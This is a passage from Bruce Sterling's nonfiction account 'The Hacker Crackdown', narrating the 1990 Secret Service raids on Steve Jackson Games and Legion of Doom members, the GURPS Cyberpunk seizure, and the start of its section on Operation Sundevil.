of Doom, was wakened by a police revolver levelled at his head.    Bloodaxe watched, jittery, as Secret Service agents appropriated his 300 baud terminal and, rifling his files, discovered his treasured source code for Robert Morris's notorious Internet Worm.  But Bloodaxe, a wily operator, had suspected that something of the like might be coming.  All his best equipment had been hidden away elsewhere.  The raiders took everything electronic, however, including his telephone.  They were stymied by his hefty arcade style Pac Man game, and left it in place, as it was simply too heavy to move.    Bloodaxe was not arrested.  He was not charged with any crime.  A good two years later, the police still had what they had taken from him, however.    The Mentor was less wary.  The dawn raid rousted him and his wife from bed in their underwear, and six Secret Service agents, accompanied by an Austin policeman and Henry Kluepfel himself, made a rich haul.  Off went the works, into the agents' white Chevrolet minivan   an IBM PC AT clone with 4 meg of RAM and a 120 meg hard disk  a Hewlett Packard LaserJet II printer  a completely legitimate and highly expensive SCO Xenix 286 operating system  Pagemaker disks and documentation  and the Microsoft Word word processing program.  Mentor's wife had her incomplete academic thesis stored on the hard disk  that went, too, and so did the couple's telephone.  As of two years later, all this property remained in police custody.    Mentor remained under guard in his apartment as agents prepared to raid Steve Jackson Games.  The fact that this was a business headquarters and not a private residence did not deter the agents.  It was still very early  no one was at work yet. The agents prepared to break down the door, but Mentor, eavesdropping on the Secret Service walkie talkie traffic, begged them not to do it, and offered his key to the building.    The exact details of the next events are unclear.  The agents would not let anyone else into the building.  Their search warrant, when produced, was unsigned.  Apparently they breakfasted from the local  Whataburger,  as the litter from hamburgers was later found inside.  They also extensively sampled a bag of jellybeans kept by an SJG employee.  Someone tore a  Dukakis for President  sticker from the wall.    SJG employees, diligently showing up for the day's work, were met at the door and briefly questioned by U.S. Secret Service agents.  The employees watched in astonishment as agents wielding crowbars and screwdrivers emerged with captive machines. They attacked outdoor storage units with boltcutters.  The agents wore blue nylon windbreakers with  SECRET SERVICE  stencilled across the back, with running shoes and jeans.    Jackson's company lost three computers, several hard  disks, hundred of floppy disks, two monitors, three modems, a laser printer, various powercords, cables, and adapters  and, oddly, a small bag of screws, bolts and nuts .  The seizure of Illuminati BBS deprived SJG of all the programs, text files, and private e mail on the board.  The loss of two other SJG computers was a severe blow as well, since it caused the loss of electronically stored contracts, financial projections, address directories, mailing lists, personnel files, business correspondence, and, not least, the drafts of forthcoming games and gaming books.    No one at Steve Jackson Games was arrested.  No one was accused of any crime.  No charges were filed.  Everything appropriated was officially kept as  evidence  of crimes never specified.    After the PHRACK show trial, the Steve Jackson Games scandal was the most bizarre and aggravating incident of the Hacker Crackdown of 1990.  This raid by the Chicago Task Force on a science fiction gaming publisher was to rouse a swarming host of civil liberties issues, and gave rise to an enduring controversy that was still re complicating itself, and growing in the scope of its implications, a full two years later.    The pursuit of the E911 Document stopped with the Steve Jackson Games raid.  As we have seen, there were hundreds, perhaps thousands of computer users in America with the E911 Document in their possession.  Theoretically, Chicago had a perfect legal right to raid any of these people, and could have legally seized the machines of anybody who subscribed to PHRACK. However, there was no copy of the E911 Document on Jackson's Illuminati board.  And there the Chicago raiders stopped dead  they have not raided anyone since.    It might be assumed that Rich Andrews and Charlie Boykin, who had brought the E911 Document to the attention of telco security, might be spared any official suspicion.  But as we have seen, the willingness to  cooperate fully  offers little, if any, assurance against federal anti hacker prosecution.    Richard Andrews found himself in deep trouble, thanks to the E911 Document.  Andrews lived in Illinois, the native stomping grounds of the Chicago Task Force.  On February 3 and 6, both his home and his place of work were raided by USSS.  His machines went out the door, too, and he was grilled at length  though not arrested .  Andrews proved to be in purportedly guilty possession of   UNIX SVR 3.2  UNIX SVR 3.1  UUCP  PMON  WWB  IWB  DWB  NROFF  KORN SHELL '88  C    and QUEST, among other items.  Andrews had received this proprietary code  which AT T officially valued at well over  250,000  through the UNIX network, much of it supplied to him as a personal favor by Terminus.  Perhaps worse yet, Andrews admitted to returning the favor, by passing Terminus a copy of AT T proprietary STARLAN source code.    Even Charles Boykin, himself an AT T employee, entered some very hot water.  By 1990, he'd almost forgotten about the E911 problem he'd reported in September 88  in fact, since that date, he'd passed two more security alerts to Jerry Dalton, concerning matters that Boykin considered far worse than the E911 Document.    But by 1990, year of the crackdown, AT T Corporate Information Security was fed up with  Killer.   This machine offered no direct income to AT T, and was providing aid and comfort to a cloud of suspicious yokels from outside the company, some of them actively malicious toward AT T, its property, and its corporate interests.  Whatever goodwill and publicity had been won among Killer's 1,500 devoted users was considered no longer worth the security risk.  On February 20, 1990, Jerry Dalton arrived in Dallas and simply unplugged the phone jacks, to the puzzled alarm of Killer's many Texan users.  Killer went permanently off line, with the loss of vast archives of programs and huge quantities of electronic mail  it was never restored to service.  AT T showed no particular regard for the  property  of these 1,500 people.  Whatever  property  the users had been storing on AT T's computer simply vanished completely.    Boykin, who had himself reported the E911 problem, now found himself under a cloud of suspicion.  In a weird private  security replay of the Secret Service seizures, Boykin's own home was visited by AT T Security and his own machines were carried out the door.    However, there were marked special features in the Boykin case.  Boykin's disks and his personal computers were swiftly examined by his corporate employers and returned politely in just two days   unlike Secret Service seizures, which commonly take months or years .  Boykin was not charged with any crime or wrongdoing, and he kept his job with AT T  though he did retire from AT T in September 1991, at the age of 52 .    It's interesting to note that the US Secret Service somehow failed to seize Boykin's  Killer  node and carry AT T's own computer out the door.  Nor did they raid Boykin's home. They seemed perfectly willing to take the word of AT T Security that AT T's employee, and AT T's  Killer  node, were free of hacker contraband and on the up and up.    It's digital water under the bridge at this point, as Killer's 3,200 megabytes of Texan electronic community were erased in 1990, and  Killer  itself was shipped out of the state.    But the experiences of Andrews and Boykin, and the users of their systems, remained side issues.  They did not begin to assume the social, political, and legal importance that gathered, slowly but inexorably, around the issue of the raid on Steve Jackson Games.       We must now turn our attention to Steve Jackson Games itself, and explain what SJG was, what it really did, and how it had managed to attract this particularly odd and virulent kind of trouble.  The reader may recall that this is not the first but the second time that the company has appeared in this narrative  a Steve Jackson game called GURPS was a favorite pastime of Atlanta hacker Urvile, and Urvile's science fictional gaming notes had been mixed up promiscuously with notes about his actual computer intrusions.    First, Steve Jackson Games, Inc., was NOT a publisher of  computer games.   SJG published  simulation games,  parlor games that were played on paper, with pencils, and dice, and printed guidebooks full of rules and statistics tables.  There were no computers involved in the games themselves.  When you bought a Steve Jackson Game, you did not receive any software disks.  What you got was a plastic bag with some cardboard game tokens, maybe a few maps or a deck of cards.  Most of their products were books.    However, computers WERE deeply involved in the Steve Jackson Games business.  Like almost all modern publishers, Steve Jackson and his fifteen employees used computers to write text, to keep accounts, and to run the business generally.  They also used a computer to run their official bulletin board system for Steve Jackson Games, a board called Illuminati.  On Illuminati, simulation gamers who happened to own computers and modems could associate, trade mail, debate the theory and practice of gaming, and keep up with the company's news and its product announcements.    Illuminati was a modestly popular board, run on a small computer with limited storage, only one phone line, and no ties to large scale computer networks.  It did, however, have hundreds of users, many of them dedicated gamers willing to call from out  of state.    Illuminati was NOT an  underground  board.  It did not feature hints on computer intrusion, or  anarchy files,  or illicitly posted credit card numbers, or long distance access codes.  Some of Illuminati's users, however, were members of the Legion of Doom.  And so was one of Steve Jackson's senior employees  the Mentor.  The Mentor wrote for PHRACK, and also ran an underground board, Phoenix Project  but the Mentor was not a computer professional.  The Mentor was the managing editor of Steve Jackson Games and a professional game designer by trade. These LoD members did not use Illuminati to help their HACKING activities.  They used it to help their GAME PLAYING activities   and they were even more dedicated to simulation gaming than they were to hacking.     Illuminati  got its name from a card game that Steve Jackson himself, the company's founder and sole owner, had invented.  This multi player card game was one of Mr Jackson's best known, most successful, most technically innovative products.   Illuminati  was a game of paranoiac conspiracy in which various antisocial cults warred covertly to dominate the world.   Illuminati  was hilarious, and great fun to play, involving flying saucers, the CIA, the KGB, the phone companies, the Ku Klux Klan, the South American Nazis, the cocaine cartels, the Boy Scouts, and dozens of other splinter groups from the twisted depths of Mr. Jackson's professionally fervid imagination.  For the uninitiated, any public discussion of the  Illuminati  card game sounded, by turns, utterly menacing or completely insane.    And then there was SJG's  Car Wars,  in which souped up armored hot rods with rocket launchers and heavy machine guns did battle on the American highways of the future.  The lively Car Wars discussion on the Illuminati board featured many meticulous, painstaking discussions of the effects of grenades, land mines, flamethrowers and napalm.  It sounded like hacker anarchy files run amuck.    Mr. Jackson and his co workers earned their daily bread by supplying people with make believe adventures and weird ideas. The more far out, the better.    Simulation gaming is an unusual pastime, but gamers have not generally had to beg the permission of the Secret Service to exist.  Wargames and role playing adventures are an old and honored pastime, much favored by professional military strategists.  Once little known, these games are now played by hundreds of thousands of enthusiasts throughout North America, Europe and Japan.  Gaming books, once restricted to hobby outlets, now commonly appear in chain stores like B. Dalton's and Waldenbooks, and sell vigorously.    Steve Jackson Games, Inc., of Austin, Texas, was a games company of the middle rank.  In 1989, SJG grossed about a million dollars.  Jackson himself had a good reputation in his industry as a talented and innovative designer of rather unconventional games, but his company was something less than a titan of the field  certainly not like the multimillion dollar TSR Inc., or Britain's gigantic  Games Workshop.     SJG's Austin headquarters was a modest two story brick office suite, cluttered with phones, photocopiers, fax machines and computers. It bustled with semi organized activity and was littered with glossy promotional brochures and dog eared science  fiction novels.  Attached to the offices was a large tin roofed warehouse piled twenty feet high with cardboard boxes of games and books.  Despite the weird imaginings that went on within it, the SJG headquarters was quite a quotidian, everyday sort of place.  It looked like what it was   a publishers' digs.    Both  Car Wars  and  Illuminati  were well known, popular games.  But the mainstay of the Jackson organization was their Generic Universal Role Playing System,  G.U.R.P.S.   The GURPS system was considered solid and well designed, an asset for players.  But perhaps the most popular feature of the GURPS system was that it allowed gaming masters to design scenarios that closely resembled well known books, movies, and other works of fantasy.  Jackson had licensed and adapted works from many science fiction and fantasy authors.  There was GURPS CONAN, GURPS RIVERWORLD, GURPS HORSECLANS, GURPS WITCH WORLD, names eminently familiar to science fiction readers.  And there was GURPS SPECIAL OPS, from the world of espionage fantasy and unconventional warfare.    And then there was GURPS CYBERPUNK.     Cyberpunk  was a term given to certain science fiction writers who had entered the genre in the 1980s.   Cyberpunk,  as the label implies, had two general distinguishing features. First, its writers had a compelling interest in information technology, an interest closely akin to science fiction's earlier fascination with space travel.  And second, these writers were  punks,  with all the distinguishing features that that implies  Bohemian artiness, youth run wild, an air of deliberate rebellion, funny clothes and hair, odd politics, a fondness for abrasive rock and roll  in a word, trouble.    The  cyberpunk  SF writers were a small group of mostly college educated white middle class litterateurs, scattered through the US and Canada.  Only one, Rudy Rucker, a professor of computer science in Silicon Valley, could rank with even the humblest computer hacker.  But, except for Professor Rucker, the  cyberpunk  authors were not programmers or hardware experts  they considered themselves artists  as, indeed, did Professor Rucker .  However, these writers all owned computers, and took an intense and public interest in the social ramifications of the information industry.    The cyberpunks had a strong following among the global generation that had grown up in a world of computers, multinational networks, and cable television.  Their outlook was considered somewhat morbid, cynical, and dark, but then again, so was the outlook of their generational peers.  As that generation matured and increased in strength and influence, so did the cyberpunks.  As science fiction writers went, they were doing fairly well for themselves.  By the late 1980s, their work had attracted attention from gaming companies, including Steve Jackson Games, which was planning a cyberpunk simulation for the flourishing GURPS gaming system.    The time seemed ripe for such a product, which had already been proven in the marketplace.  The first games company out of the gate, with a product boldly called  Cyberpunk  in defiance of possible infringement of copyright suits, had been an upstart group called R. Talsorian.  Talsorian's Cyberpunk was a fairly decent game, but the mechanics of the simulation system left a lot to be desired.  Commercially, however, the game did very well.    The next cyberpunk game had been the even more successful SHADOWRUN by FASA Corporation.  The mechanics of this game were fine, but the scenario was rendered moronic by sappy fantasy elements like elves, trolls, wizards, and dragons  all highly ideologically incorrect, according to the hard edged, high tech standards of cyberpunk science fiction.    Other game designers were champing at the bit.  Prominent among them was the Mentor, a gentleman who, like most of his friends in the Legion of Doom, was quite the cyberpunk devotee. Mentor reasoned that the time had come for a REAL cyberpunk gaming book  one that the princes of computer mischief in the Legion of Doom could play without laughing themselves sick.  This book, GURPS CYBERPUNK, would reek of culturally on line authenticity.    Mentor was particularly well qualified for this task. Naturally, he knew far more about computer intrusion and digital skullduggery than any previously published cyberpunk author.  Not only that, but he was good at his work.  A vivid imagination, combined with an instinctive feeling for the working of systems and, especially, the loopholes within them, are excellent qualities for a professional game designer.    By March 1st, GURPS CYBERPUNK was almost complete, ready to print and ship.  Steve Jackson expected vigorous sales for this item, which, he hoped, would keep the company financially afloat for several months.  GURPS CYBERPUNK, like the other GURPS  modules,  was not a  game  like a Monopoly set, but a BOOK   a bound paperback book the size of a glossy magazine, with a slick color cover, and pages full of text, illustrations, tables and footnotes.  It was advertised as a game, and was used as an aid to game playing, but it was a book, with an ISBN number, published in Texas, copyrighted, and sold in bookstores.    And now, that book, stored on a computer, had gone out the door in the custody of the Secret Service.    The day after the raid, Steve Jackson visited the local Secret Service headquarters with a lawyer in tow.  There he confronted Tim Foley  still in Austin at that time  and demanded his book back.  But there was trouble.  GURPS CYBERPUNK, alleged a Secret Service agent to astonished businessman Steve Jackson, was  a manual for computer crime.      It's science fiction,  Jackson said.     No, this is real.   This statement was repeated several times, by several agents.  Jackson's ominously accurate game had passed from pure, obscure, small scale fantasy into the impure, highly publicized, large scale fantasy of the Hacker Crackdown.    No mention was made of the real reason for the search. According to their search warrant, the raiders had expected to find the E911 Document stored on Jackson's bulletin board system. But that warrant was sealed  a procedure that most law enforcement agencies will use only when lives are demonstrably in danger.  The raiders' true motives were not discovered until the Jackson search warrant was unsealed by his lawyers, many months later.  The Secret Service, and the Chicago Computer Fraud and Abuse Task Force, said absolutely nothing to Steve Jackson about any threat to the police 911 System.  They said nothing about the Atlanta Three, nothing about PHRACK or Knight Lightning, nothing about Terminus.    Jackson was left to believe that his computers had been seized because he intended to publish a science fiction book that law enforcement considered too dangerous to see print.    This misconception was repeated again and again, for months, to an ever widening public audience.  It was not the truth of the case  but as months passed, and this misconception was publicly printed again and again, it became one of the few publicly known  facts  about the mysterious Hacker Crackdown. The Secret Service had seized a computer to stop the publication of a cyberpunk science fiction book.    The second section of this book,  The Digital Underground,  is almost finished now.  We have become acquainted with all the major figures of this case who actually belong to the underground milieu of computer intrusion.  We have some idea of their history, their motives, their general modus operandi. We now know, I hope, who they are, where they came from, and more or less what they want.  In the next section of this book,  Law and Order,  we will leave this milieu and directly enter the world of America's computer crime police.    At this point, however, I have another figure to introduce   myself.    My name is Bruce Sterling.  I live in Austin, Texas, where I am a science fiction writer by trade   specifically, a CYBERPUNK science fiction writer.    Like my  cyberpunk  colleagues in the U.S. and Canada, I've never been entirely happy with this literary label   especially after it became a synonym for computer criminal.  But I did once edit a book of stories by my colleagues, called MIRRORSHADES   THE CYBERPUNK ANTHOLOGY, and I've long been a writer of literary critical cyberpunk manifestos.  I am not a  hacker  of any description, though I do have readers in the digital underground.    When the Steve Jackson Games seizure occurred, I naturally took an intense interest.  If  cyberpunk  books were being banned by federal police in my own home town, I reasonably wondered whether I myself might be next.  Would my computer be seized by the Secret Service   At the time, I was in possession of an aging Apple IIe without so much as a hard disk.  If I were to be raided as an author of computer crime manuals, the loss of my feeble word processor would likely provoke more snickers than sympathy.    I'd known Steve Jackson for many years.  We knew one another as colleagues, for we frequented the same local science  fiction conventions.  I'd played Jackson games, and recognized his cleverness  but he certainly had never struck me as a potential mastermind of computer crime.    I also knew a little about computer bulletin board systems.  In the mid 1980s I had taken an active role in an Austin board called  SMOF BBS,  one of the first boards dedicated to science fiction.  I had a modem, and on occasion I'd logged on to Illuminati, which always looked entertainly wacky, but certainly harmless enough.    At the time of the Jackson seizure, I had no experience whatsoever with underground boards.  But I knew that no one on Illuminati talked about breaking into systems illegally, or about robbing phone companies.  Illuminati didn't even offer pirated computer games.  Steve Jackson, like many creative artists, was markedly touchy about theft of intellectual property.    It seemed to me that Jackson was either seriously suspected of some crime  in which case, he would be charged soon, and would have his day in court  or else he was innocent, in which case the Secret Service would quickly return his equipment, and everyone would have a good laugh.  I rather expected the good laugh.  The situation was not without its comic side.  The raid, known as the  Cyberpunk Bust  in the science fiction community, was winning a great deal of free national publicity both for Jackson himself and the  cyberpunk  science fiction writers generally.    Besides, science fiction people are used to being misinterpreted.  Science fiction is a colorful, disreputable, slipshod occupation, full of unlikely oddballs, which, of course, is why we like it.  Weirdness can be an occupational hazard in our field.  People who wear Halloween costumes are sometimes mistaken for monsters.    Once upon a time  back in 1939, in New York City  science fiction and the U.S. Secret Service collided in a comic case of mistaken identity.  This weird incident involved a literary group quite famous in science fiction, known as  the Futurians,  whose membership included such future genre greats as Isaac Asimov, Frederik Pohl, and Damon Knight.  The Futurians were every bit as offbeat and wacky as any of their spiritual descendants, including the cyberpunks, and were given to communal living, spontaneous group renditions of light opera, and midnight fencing exhibitions on the lawn.  The Futurians didn't have bulletin board systems, but they did have the technological equivalent in 1939  mimeographs and a private printing press.  These were in steady use, producing a stream of science fiction fan magazines, literary manifestos, and weird articles, which were picked up in ink sticky bundles by a succession of strange, gangly, spotty young men in fedoras and overcoats.    The neighbors grew alarmed at the antics of the Futurians and reported them to the Secret Service as suspected counterfeiters.  In the winter of 1939, a squad of USSS agents with drawn guns burst into  Futurian House,  prepared to confiscate the forged currency and illicit printing presses. There they discovered a slumbering science fiction fan named George Hahn, a guest of the Futurian commune who had just arrived in New York.  George Hahn managed to explain himself and his group, and the Secret Service agents left the Futurians in peace henceforth.   Alas, Hahn died in 1991, just before I had discovered this astonishing historical parallel, and just before I could interview him for this book.     But the Jackson case did not come to a swift and comic end.  No quick answers came his way, or mine  no swift reassurances that all was right in the digital world, that matters were well in hand after all.  Quite the opposite.  In my alternate role as a sometime pop science journalist, I interviewed Jackson and his staff for an article in a British magazine.  The strange details of the raid left me more concerned than ever.  Without its computers, the company had been financially and operationally crippled.  Half the SJG workforce, a group of entirely innocent people, had been sorrowfully fired, deprived of their livelihoods by the seizure.  It began to dawn on me that authors  American writers  might well have their computers seized, under sealed warrants, without any criminal charge  and that, as Steve Jackson had discovered, there was no immediate recourse for this.  This was no joke  this wasn't science fiction  this was real.    I determined to put science fiction aside until I had discovered what had happened and where this trouble had come from.  It was time to enter the purportedly real world of electronic free expression and computer crime.  Hence, this book. Hence, the world of the telcos  and the world of the digital underground  and next, the world of the police.      PART THREE   LAW AND ORDER     Of the various anti hacker activities of 1990,  Operation Sundevil  had by far the highest public profile.  The sweeping, nationwide computer seizures of May 8, 1990 were unprecedented in scope and highly, if rather selectively, publicized.    Unlike the efforts of the Chicago Computer Fraud and Abuse Task Force,  Operation Sundevil  was not intended to combat  hacking  in the sense of computer intrusion or sophisticated raids on telco switching stations.  Nor did it have anything to do with hacker misdeeds with AT T's software, or with Southern Bell's proprietary documents.    Instead,  Operation Sundevil  was a crackdown on those traditional scourges of the digital underground   credit card theft and telephone code abuse.  The ambitious activities out of Chicago, and the somewhat lesser known but vigorous anti hacker actions of the New York State Police in 1990, were never a part of  Operation Sundevil  per se, which was based in Arizona.    Nevertheless, after the spectacular May 8 raids, the public, misled by police secrecy, hacker panic, and a puzzled national press corps, conflated all aspects of the nationwide crackdown in 1990 under the blanket term  Operation Sundevil.   Sundevil  is still the best known synonym for the crackdown of 1990.  But the Arizona organizers of  Sundevil  did not really deserve this reputation  any more, for instance, than all hackers deserve a reputation as  hackers.     There was some justice in this confused perception, though.  For one thing, the confusion was abetted by the Washington office of the Secret Service, who responded to Freedom of Information Act requests on  Operation Sundevil  by referring investigators to the publicly known cases of Knight Lightning and the Atlanta Three.  And  Sundevil  was certainly the largest aspect of the Crackdown, the most deliberate and the best  organized.  As a crackdown on electronic fraud,  Sundevil  lacked the frantic pace of the war on the Legion of Doom  on the contrary, Sundevil's targets were picked out with cool deliberation over an elaborate investigation lasting two full years.    And once again the targets were bulletin board systems.    Boards can be powerful aids to organized fraud. Underground boards carry lively, extensive, detailed, and often quite flagrant  discussions  of lawbreaking techniques and lawbreaking activities.   Discussing  crime in the abstract, or  discussing  the particulars of criminal cases, is not illegal   but there are stern state and federal laws against coldbloodedly conspiring in groups in order to commit crimes.    In the eyes of police, people who actively conspire to break the law are not regarded as  clubs,   debating salons,   users' groups,  or  free speech advocates.   Rather, such people tend to find themselves formally indicted by prosecutors as  gangs,   racketeers,   corrupt organizations  and  organized crime figures.     What's more, the illicit data contained on outlaw boards goes well beyond mere acts of speech and or possible criminal conspiracy.  As we have seen, it was common practice in the digital underground to post purloined telephone codes on boards, for any phreak or hacker who cared to abuse them.  Is posting digital booty of this sort supposed to be protected by the First Amendment   Hardly  though the issue, like most issues in cyberspace, is not entirely resolved.  Some theorists argue that to merely RECITE a number publicly is not illegal  only its USE is illegal.  But anti hacker police point out that magazines and newspapers  more traditional forms of free expression  never publish stolen telephone codes  even though this might well raise their circulation .    Stolen credit card numbers, being riskier and more valuable, were less often publicly posted on boards  but there is no question that some underground boards carried  carding  traffic, generally exchanged through private mail.    Underground boards also carried handy programs for  scanning  telephone codes and raiding credit card companies, as well as the usual obnoxious galaxy of pirated software, cracked passwords, blue box schematics, intrusion manuals, anarchy files, porn files, and so forth.    But besides their nuisance potential for the spread of illicit knowledge, bulletin boards have another vitally interesting aspect for the professional investigator.  Bulletin boards are cram full of EVIDENCE.  All that busy trading of electronic mail, all those hacker boasts, brags and struts, even the stolen codes and cards, can be neat, electronic, real time recordings of criminal activity.    As an investigator, when you seize a pirate board, you have scored a coup as effective as tapping phones or intercepting mail.  However, you have not actually tapped a phone or intercepted a letter.  The rules of evidence regarding phone taps and mail interceptions are old, stern and well understood by police, prosecutors and defense attorneys alike.  The rules of evidence regarding boards are new, waffling, and understood by nobody at all.    Sundevil was the largest crackdown on boards in world history.  On May 7, 8, and 9, 1990, about forty two computer systems were seized.  Of those forty two computers, about twenty  five actually were running boards.   The vagueness of this estimate is attributable to the vagueness of  a  what a  computer system  is, and  b  what it actually means to  run a board  with one  or with two computers, or with three.     About twenty five boards vanished into police custody in May 1990.  As we have seen, there are an estimated 30,000 boards in America today.  If we assume that one board in a hundred is up to no good with codes and cards  which rather flatters the honesty of the board using community , then that would leave 2,975 outlaw boards untouched by Sundevil.  Sundevil seized about one tenth of one percent of all computer bulletin boards in America.  Seen objectively, this is something less than a comprehensive assault.  In 1990, Sundevil's organizers  the team at the Phoenix Secret Service office, and the Arizona Attorney General's office  had a list of at least THREE HUNDRED boards that they considered fully deserving of search and seizure warrants.  The twenty five boards actually seized were merely among the most obvious and egregious of this much larger list of candidates.  All these boards had been examined beforehand   either by informants, who had passed printouts to the Secret Service, or by Secret Service agents themselves, who not only come equipped with modems but know how to use them.    There were a number of motives for Sundevil.  First, it offered a chance to get ahead of the curve on wire fraud crimes. Tracking back credit card ripoffs to their perpetrators can be appallingly difficult.  If these miscreants have any kind of electronic sophistication, they can snarl their tracks through the phone network into a mind boggling, untraceable mess, while still managing to  reach out and rob someone.   Boards, however, full of brags and boasts, codes and cards, offer evidence in the handy congealed form.    Seizures themselves  the mere physical removal of machines  tends to take the pressure off.  During Sundevil, a large number of code kids, warez d00dz, and credit card thieves would be deprived of those boards  their means of community and conspiracy  in one swift blow.  As for the sysops themselves  commonly among the boldest offenders  they would be directly stripped of their computer equipment, and rendered digitally mute and blind.    And this aspect of Sundevil was carried out with great success.  Sundevil seems to have been a complete tactical surprise  unlike the fragmentary and continuing seizures of the war on the Legion of Doom, Sundevil was precisely timed and utterly overwhelming.  At least forty  computers  were seized during May 7, 8 and 9, 1990, in Cincinnati, Detroit, Los Angeles, Miami, Newark, Phoenix, Tucson, Richmond, San Diego, San Jose, Pittsburgh and San Francisco.  Some cities saw multiple raids, such as the five separate raids in the New York City environs. Plano, Texas  essentially a suburb of the Dallas Fort Worth metroplex, and a hub of the telecommunications industry  saw four computer seizures.  Chicago, ever in the forefront, saw its own local Sundevil raid, briskly carried out by Secret Service agents Timothy Foley and Barbara Golden.    Many of these raids occurred, not in the cities proper, but in associated white middle class suburbs  places like Mount Lebanon, Pennsylvania and Clark Lake, Michigan.  There were a few raids on offices  most took place in people's homes, the classic hacker basements and bedrooms.    The Sundevil raids were searches and seizures, not a group of mass arrests.  There were only four arrests during Sundevil.   Tony the Trashman,  a longtime teenage bete noire of the Arizona Racketeering unit, was arrested in Tucson on May 9.  Dr. Ripco,  sysop of an outlaw board with the misfortune to exist in Chicago itself, was also arrested  on illegal weapons charges.  Local units also arrested a 19 year old female phone phreak named  Electra  in Pennsylvania, and a male juvenile in California.  Federal agents however were not seeking arrests, but computers.    Hackers are generally not indicted  if at all  until the evidence in their seized computers is evaluated  a process that can take weeks, months  even years.  When hackers are arrested on the spot, it's generally an arrest for other reasons.  Drugs and or illegal weapons show up in a good third of anti hacker computer seizures  though not during Sundevil .    That scofflaw teenage hackers  or their parents  should have marijuana in their homes is probably not a shocking revelation, but the surprisingly common presence of illegal firearms in hacker dens is a bit disquieting.  A Personal Computer can be a great equalizer for the techno cowboy  much like that more traditional American  Great Equalizer,  the Personal Sixgun.  Maybe it's not all that surprising that some guy obsessed with power through illicit technology would also have a few illicit high velocity impact devices around.  An element of the digital underground particularly dotes on those  anarchy philes,  and this element tends to shade into the crackpot milieu of survivalists, gun nuts, anarcho leftists and the ultra libertarian right wing.    This is not to say that hacker raids to date have uncovered any major crack dens or illegal arsenals  but Secret Service agents do not regard  hackers  as  just kids.   They regard hackers as unpredictable people, bright and slippery.  It doesn't help matters that the hacker himself has been  hiding behind his keyboard  all this time.  Commonly, police have no idea what he looks like.  This makes him an unknown quantity, someone best treated with proper caution.    To date, no hacker has come out shooting, though they do sometimes brag on boards that they will do just that.  Threats of this sort are taken seriously.  Secret Service hacker raids tend to be swift, comprehensive, well manned  even over manned   and agents generally burst through every door in the home at once, sometimes with drawn guns.  Any potential resistance is swiftly quelled.  Hacker raids are usually raids on people's homes.  It can be a very dangerous business to raid an American home  people can panic when strangers invade their sanctum.  Statistically speaking, the most dangerous thing a policeman can do is to enter someone's home.   The second most dangerous thing is to stop a car in traffic.   People have guns in their homes.  More cops are hurt in homes than are ever hurt in biker bars or massage parlors.    But in any case, no one was hurt during Sundevil, or indeed during any part of the Hacker Crackdown.    Nor were there any allegations of any physical mistreatment of a suspect.  Guns were pointed, interrogations were sharp and prolonged  but no one in 1990 claimed any act of brutality by any crackdown raider.    In addition to the forty or so computers, Sundevil reaped floppy disks in particularly great abundance  an estimated 23,000 of them, which naturally included every manner of illegitimate data   pirated games, stolen codes, hot credit card numbers, the complete text and software of entire pirate bulletin boards. These floppy disks, which remain in police custody today, offer a gigantic, almost embarrassingly rich source of possible criminal indictments.  These 23,000 floppy disks also include a thus far unknown quantity of legitimate computer games, legitimate software, purportedly  private  mail from boards, business records, and personal correspondence of all kinds.    Standard computer crime search warrants lay great emphasis on seizing written documents as well as computers   specifically including photocopies, computer printouts, telephone bills, address books, logs, notes, memoranda and correspondence. In practice, this has meant that diaries, gaming magazines, software documentation, nonfiction books on hacking and computer security, sometimes even science fiction novels, have all vanished out the door in police custody.  A wide variety of electronic items have been known to vanish as well, including telephones, televisions, answering machines, Sony Walkmans, desktop printers, compact disks, and audiotapes.    No fewer than 150 members of the Secret Service were sent into the field during Sundevil.  They were commonly accompanied by squads of local and or state police.  Most of these officers   especially the locals  had never been on an anti hacker raid before.   This was one good reason, in fact, why so many of them were invited along in the first place.   Also, the presence of a uniformed police officer assures the raidees that the people entering their homes are, in fact, police.  Secret Service agents wear plain clothes.  So do the telco security experts who commonly accompany the Secret Service on raids  and who make no particular effort to identify themselves as mere employees of telephone companies .    A typical hacker raid goes something like this.  First, police storm in rapidly, through every entrance, with overwhelming force, in the assumption that this tactic will keep casualties to a minimum.  Second, possible suspects are immediately removed from the vicinity of any and all computer systems, so that they will have no chance to purge or destroy computer evidence.  Suspects are herded into a room without computers, commonly the living room, and kept under guard  not ARMED guard, for the guns are swiftly holstered, but under guard nevertheless.  They are presented with the search warrant and warned that anything they say may be held against them.  Commonly they have a great deal to say, especially if they are unsuspecting parents.    Somewhere in the house is the  hot spot   a computer tied to a phone line  possibly several computers and several phones . Commonly it's a teenager's bedroom, but it can be anywhere in the house  there may be several such rooms.  This  hot spot  is put in charge of a two agent team, the  finder  and the  recorder.  The  finder  is computer trained, commonly the case agent who has actually obtained the search warrant from a judge.  He or she understands what is being sought, and actually carries out the seizures  unplugs machines, opens drawers, desks, files, floppy  disk containers, etc.  The  recorder  photographs all the equipment, just as it stands  especially the tangle of wired connections in the back, which can otherwise be a real nightmare to restore.  The recorder will also commonly photograph every room in the house, lest some wily criminal claim that the police had robbed him during the search.  Some recorders carry videocams or tape recorders  however, it's more common for the recorder to simply take written notes.  Objects are described and numbered as the finder seizes them, generally on standard preprinted police inventory forms.    Even Secret Service agents were not, and are not, expert computer users.  They have not made, and do not make, judgements on the fly about potential threats posed by various forms of equipment.  They may exercise discretion  they may leave Dad his computer, for instance, but they don't HAVE to.  Standard computer crime search warrants, which date back to the early 80s, use a sweeping language that targets computers, most anything attached to a computer, most anything used to operate a computer  most anything that remotely resembles a computer  plus most any and all written documents surrounding it.  Computer  crime investigators have strongly urged agents to seize the works.    In this sense, Operation Sundevil appears to have been a complete success.  Boards went down all over America, and were shipped en masse to the computer investigation lab of the Secret Service, in Washington DC, along with the 23,000 floppy disks and unknown quantities of printed material.    But the seizure of twenty five boards, and the multi  megabyte mountains of possibly useful evidence contained in these boards  and in their owners' other computers, also out the door , were far from the only motives for Operation Sundevil.  An unprecedented action of great ambition and size, Sundevil's motives can only be described as political.  It was a public  relations effort, meant to pass certain messages, meant to make certain situations clear   both in the mind of the general public, and in the minds of various constituencies of the electronic community.     First  and this motivation was vital  a  message  would be sent from law enforcement to the digital underground.  This very message was recited in so many words by Garry M. Jenkins, the Assistant Director of the US Secret Service, at the Sundevil press conference in Phoenix on May 9, 1990, immediately after the raids.  In brief, hackers were mistaken in their foolish belief that they could hide behind the  relative anonymity of their computer terminals.   On the contrary, they should fully understand that state and federal cops were actively patrolling the beat in cyberspace  that they were on the watch everywhere, even in those sleazy and secretive dens of cybernetic vice, the underground boards.    This is not an unusual message for police to publicly convey to crooks.  The message is a standard message  